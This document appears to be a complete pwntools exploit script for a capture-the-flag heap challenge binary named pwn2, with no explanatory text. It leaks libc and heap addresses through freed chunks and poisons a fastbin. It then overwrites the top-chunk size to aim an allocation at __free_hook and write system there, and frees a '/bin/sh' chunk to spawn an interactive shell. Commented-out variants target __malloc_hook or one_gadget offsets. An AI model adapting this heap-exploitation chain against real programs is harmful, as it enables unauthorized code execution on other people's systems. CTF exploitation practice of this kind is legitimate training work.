from pwn import *
#context(log_level='debug',arch='amd64',os='linux')
p=process('./pwn2')
elf=ELF('./pwn2')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#gdb.attach(p)
def add(size,x):
	p.recvuntil('choice >> ')
	p.sendline('1')
	p.recvuntil('Please enter the length of the note:\n')
	p.sendline(str(size))
	p.recvuntil('Please enter the data of the note:\n')
	p.sendline(x)

def dele(idx):
	p.recvuntil('choice >> ')
	p.sendline('3')
	p.recvuntil('Please enter the index of the note:\n')
	p.sendline(str(idx))
	
def edit(idx,x):
	p.recvuntil('choice >> ')
	p.sendline('2')
	p.recvuntil('Please enter the index of the note:\n')
	p.sendline(str(idx))
	p.recvuntil('Please enter the data of the note:\n')
	p.sendline(x)

def show():
	p.recvuntil('choice >> ')
	p.sendline('4')

add(0x80,0x80*'a')
add(0x80,0x80*'b')
dele(0)
show()
p.recvuntil('note index 0 : ')
main_arena_88=u64(p.recv(6).ljust(8,'\x00'))-0x58
libc_base=main_arena_88-libc.symbols['__malloc_hook']-0x10
log.info('libc_base > '+hex(libc_base))
one_gadget=0xf02a4+libc_base
one_gadget=0xf1147+libc_base
one_gadget=0x45216+libc_base
malloc_hook=libc.symbols['__malloc_hook']+libc_base
log.info('malloc_hook > '+hex(malloc_hook))
free_hook=libc.symbols['__free_hook']+libc_base
log.info('free_hook > '+hex(free_hook))
system_address=libc.symbols['system']+libc_base
#one_gadget=libc_base+0xf02a4
add(0x80,'0000')
add(0x60,'1'*0x60) #3
add(0x60,'2'*0x50+p64(0)+p64(0x71))
dele(4)
dele(3)
show()
p.recvuntil('note index 3 : ')
heap_address=u64(p.recv(6).ljust(8,'\x00'))-0x70-0x90-0x90
log.info('heap_address > '+hex(heap_address))
edit(4,p64(heap_address+0x90+0x90+0x70+0x60))
add(0x60,'/bin/sh')
add(0x60,'2222')
top_ptr=heap_address+0x90+0x90+0x70+0x70
log.info('top_ptr > '+hex(top_ptr))
#top_ptr+x==free_hook/malloc_hook
#x=free_hook/malloc_hook-top_ptr
#top_size=system=origin-apply
#so origin=system+apply=system+free_hook/malloc_hook-top_ptr
log.info('top_chunk_size > '+hex(system_address+free_hook-top_ptr-0x1))
#add(0x60,p64(0)+p64(one_gadget+free_hook-top_ptr-0x1))
add(0x60,p64(0)+p64(system_address+free_hook-top_ptr-0x1))
add(free_hook-top_ptr-0x10,'\n')
dele(5)
'''
add(0x60,p64(0)+p64(one_gadget+free_hook-top_ptr-0x9))
add(free_hook-top_ptr-0x10,'\n')
dele(8)
'''
'''
add(0x60,p64(0)+p64(system_address+malloc_hook-top_ptr-0x1))
add(malloc_hook-top_ptr-0x10,'\n')
dele(3)
'''
p.interactive()
